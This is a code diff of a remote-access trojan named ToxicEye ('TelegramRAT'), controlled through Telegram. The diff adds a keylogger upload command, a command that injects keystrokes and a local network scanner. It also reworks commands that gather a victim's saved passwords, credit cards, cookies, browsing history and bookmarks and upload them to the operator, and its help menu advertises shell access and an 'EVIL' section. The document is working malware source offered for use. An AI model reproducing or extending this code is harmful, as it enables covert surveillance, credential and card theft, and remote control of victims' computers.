@@ -37,16 +37,7 @@ namespace TelegramRAT
         [DllImport("iphlpapi.dll", ExactSpelling = true)]
         public static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);
 
-        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
-        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-
-        [DllImport("user32.dll")]
-        private static extern IntPtr GetForegroundWindow();
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern int GetWindowTextLength(IntPtr hWnd);
+       
 
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern int SendMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);
@@ -77,6 +68,7 @@ namespace TelegramRAT
                             "\n /Webcam <camera> <delay>" +
                             "\n /Microphone <seconds>" +
                             "\n /Desktop" +
+                            "\n /Keylogger" +
                             "\n" +
                             "\n📋 CLIPBOARD:" +
                             "\n /ClipboardSet <text>" +
@@ -116,6 +108,8 @@ namespace TelegramRAT
                             "\n /Shell <command>" +
                             "\n /MessageBox <error/info/warn> <text> <caption>" +
                             "\n /OpenURL <url>" +
+                            "\n /SendKeyPress <keys>" +
+                            "\n /ScanNetwork <to>" +
                             "\n /Uninstall" +
                             "\n" +
                             "\n💣 EVIL:" +
@@ -133,8 +127,8 @@ namespace TelegramRAT
                             "\n /Logoff" +
                             "\n" +
                             "\n💰 OTHER:" +
-                            "\n /help" +
-                            "\n /about" +
+                            "\n /Help" +
+                            "\n /About" +
                         "");
                         break;
                     }
@@ -142,7 +136,7 @@ namespace TelegramRAT
                 case "ABOUT":
                     {
                         telegram.sendText(
-                            "\n👻 ToxiecEye" +
+                            "\n👻 ToxicEye" +
                             "\n👑 Coded by LimerBoy" +
                             "\n🔮 github.com/LimerBoy" +
                             "");
@@ -197,14 +191,7 @@ namespace TelegramRAT
                 case "LOCATION":
                     {
                         // Get gateway
-                        IPAddress dst = NetworkInterface
-                            .GetAllNetworkInterfaces()
-                            .Where(n => n.OperationalStatus == OperationalStatus.Up)
-                            .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
-                            .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
-                            .Select(g => g?.Address)
-                            .Where(a => a != null)
-                            .FirstOrDefault();
+                        IPAddress dst = utils.GetDefaultGateway();
                         // Send ARP
                         byte[] macAddr = new byte[6];
                         uint macAddrLen = (uint)macAddr.Length;
@@ -276,19 +263,7 @@ namespace TelegramRAT
                 // ActiveWindow
                 case "ACTIVEWINDOW":
                     {
-                        string result = string.Empty;
-                        IntPtr foregroundWindow = GetForegroundWindow();
-                        int num = GetWindowTextLength(foregroundWindow) + 1;
-                        StringBuilder stringBuilder = new StringBuilder(num);
-                        bool flag = GetWindowText(foregroundWindow, stringBuilder, num) > 0;
-                        if (flag)
-                        {
-                            result = stringBuilder.ToString();
-                        } else
-                        {
-                            result = "unknown";
-                        }
-                        telegram.sendText("💬 Active window: " + result);
+                        telegram.sendText("💬 Active window: " + utils.GetActiveWindowTitle());
                         break;
                     }
 
@@ -439,6 +414,19 @@ namespace TelegramRAT
                         }
                         break;
                     }
+                // Keylogger
+                case "KEYLOGGER":
+                    {
+                        if (!File.Exists(utils.loggerPath))
+                        {
+                            telegram.sendText("🔌 No keylogs recorded!");
+                            break;
+                        }
+                        string keylogsFile = Path.GetDirectoryName(utils.loggerPath) + "\\keylogs.txt";
+                        File.Copy(utils.loggerPath, keylogsFile);
+                        telegram.UploadFile(keylogsFile, true);
+                        break;
+                    }
 
 
                 // ClipboardSet <text>
@@ -558,15 +546,7 @@ namespace TelegramRAT
                                    + "\n";
                         }
                         File.WriteAllText(filename, output);
-                        telegram.UploadFile(filename);
-                        // Delete passwords.txt (костыль)
-                        while (true)
-                        {
-                            try { File.Delete(filename); }
-                            catch (IOException)
-                            { continue; }
-                            break;
-                        }
+                        telegram.UploadFile(filename, true);
                         break;
                     }
                 // GetCreditCards
@@ -584,15 +564,7 @@ namespace TelegramRAT
                                    + "\n";
                         }
                         File.WriteAllText(filename, output);
-                        telegram.UploadFile(filename);
-                        // Delete credit_cards.txt (костыль)
-                        while (true)
-                        {
-                            try { File.Delete(filename); }
-                            catch (IOException)
-                            { continue; }
-                            break;
-                        }
+                        telegram.UploadFile(filename, true);
                         break;
                     }
                 // GetHistory
@@ -610,15 +582,7 @@ namespace TelegramRAT
                                    + "\n";
                         }
                         File.WriteAllText(filename, output);
-                        telegram.UploadFile(filename);
-                        // Delete history.txt (костыль)
-                        while (true)
-                        {
-                            try { File.Delete(filename); }
-                            catch (IOException)
-                            { continue; }
-                            break;
-                        }
+                        telegram.UploadFile(filename, true);
                         break;
                     }
                 // GetBookmarks
@@ -635,15 +599,7 @@ namespace TelegramRAT
                                    + "\n";
                         }
                         File.WriteAllText(filename, output);
-                        telegram.UploadFile(filename);
-                        // Delete bookmarks.txt (костыль)
-                        while (true)
-                        {
-                            try { File.Delete(filename); }
-                            catch (IOException)
-                            { continue; }
-                            break;
-                        }
+                        telegram.UploadFile(filename, true);
                         break;
                     }
                 // GetCookies
@@ -663,15 +619,7 @@ namespace TelegramRAT
                                    + "\n";
                         }
                         File.WriteAllText(filename, output);
-                        telegram.UploadFile(filename);
-                        // Delete cookies.txt (костыль)
-                        while (true)
-                        {
-                            try { File.Delete(filename); }
-                            catch (IOException)
-                            { continue; }
-                            break;
-                        }
+                        telegram.UploadFile(filename, true);
                         break;
                     }
 
@@ -1142,6 +1090,39 @@ namespace TelegramRAT
                             telegram.sendText("⛔ Failed open URL");
                         }
                         telegram.sendText("📚 URL opened");
+                        break;
+                    }
+                // SendKeyPress <keys>
+                case "SENDKEYPRESS":
+                    {
+                        string keys;
+                        try
+                        {
+                            keys = args[1];
+                        }
+                        catch (IndexOutOfRangeException)
+                        {
+                            telegram.sendText("⛔ Argument <keys> is required for /SendKeyPress");
+                            break;
+                        }
+                        keys = string.Join(" ", args, 1, args.Length - 1);
+                        telegram.sendText("🔘 Sending keys: " + keys);
+                        SendKeys.SendWait(keys);
+                        break;
+                    }
+                // ScanNetwork
+                case "SCANNETWORK":
+                    {
+                        int to;
+                        try
+                        {
+                            to = Int32.Parse(args[1]);
+                        }
+                        catch (IndexOutOfRangeException)
+                        {
+                            to = 254;
+                        }
+                        utils.WlanScanner(to);
                         break;
                     }
                 // Uninstall
